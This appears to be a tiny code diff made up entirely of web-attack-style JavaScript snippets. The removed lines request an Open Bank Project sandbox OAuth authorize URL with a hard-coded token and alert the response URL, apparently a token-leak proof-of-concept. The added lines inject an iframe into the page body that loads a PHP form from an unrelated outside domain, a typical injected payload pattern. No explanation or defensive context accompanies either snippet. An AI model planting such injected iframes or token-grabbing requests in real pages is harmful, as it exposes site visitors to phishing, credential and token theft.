@@ -1,8 +1,3 @@
-var x=new XMLHttpRequest();x.open('GET','https://apisandbox.openbankproject.com/oauth/authorize?oauth_token=VG0J2SYVAQGZDNNI20P2BJGFNDYINEB3EO51VKDU');x.send();
-x.onreadystatechange=function(){if(this.readyState==4){alert(x.responseURL)}}
-
-
-
-
-
-
+var iframe = document.createElement("iframe");   
+iframe.src = "http://formmail-maker.com/ini/20161107-916d/form.php";   
+document.body.appendChild(iframe);
